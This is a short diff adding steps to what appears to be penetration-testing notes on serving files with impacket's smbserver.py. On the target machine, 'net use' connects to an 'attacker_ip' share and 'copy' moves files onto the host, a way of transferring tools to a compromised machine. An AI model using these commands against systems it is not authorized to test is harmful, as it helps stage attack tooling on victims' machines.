@@ -14,3 +14,19 @@ smbserver.py <share_name> <share_path> -ts -smb2support -username any -password 
 
 #### On the target machine
 
+1. connect to the share 
+
+```batch
+net use \\attacker_ip\sharename /u:username password
+```
+
+
+2. Copy contents from the share to a writable location
+
+```batch
+copy \\ip\sharename\filename <destination>
+```
+
+
+
+
